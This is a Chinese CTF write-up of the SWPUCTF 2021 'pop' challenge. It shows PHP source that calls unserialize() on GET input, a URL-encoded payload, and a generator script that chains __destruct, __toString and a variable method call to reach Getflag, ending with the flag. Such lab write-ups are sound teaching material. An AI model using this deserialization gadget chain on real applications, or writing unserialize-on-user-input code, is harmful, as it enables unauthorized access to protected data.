---
title: '[SWPUCTF 2021 新生赛]pop'
date: '2025-05-26T22:46:41+08:00'
weight: 
draft: false
description: '[SWPUCTF 2021 新生赛]pop'
---

题目代码：

```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);

?>
```

> [!NOTICE]
> {$this->w22m} 是 PHP 的可变方法名写法，用于动态调用对象方法，属于可变变量语法的一种。

构造 payload：

```text
O%3A4%3A%22w22m%22%3A1%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w33m%22%3A2%3A%7Bs%3A4%3A%22w00m%22%3BO%3A4%3A%22w44m%22%3A2%3A%7Bs%3A11%3A%22%00w44m%00admin%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00passwd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%3Bs%3A7%3A%22Getflag%22%3B%7D%7D
```

```php
<?php
class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';
}

class w22m{
    public $w00m;
}

class w33m{
    public $w00m;
    public $w22m;
}

$w3 = new w33m();
$w3->w00m = new w44m();
$w3->w22m = "Getflag";

$w2 = new w22m();
$w2->w00m = $w3;

echo urlencode(serialize($w2));
```

获得 flag：`NSSCTF{02dd21bf-8bbe-4d92-89cb-1726cc1c911d}`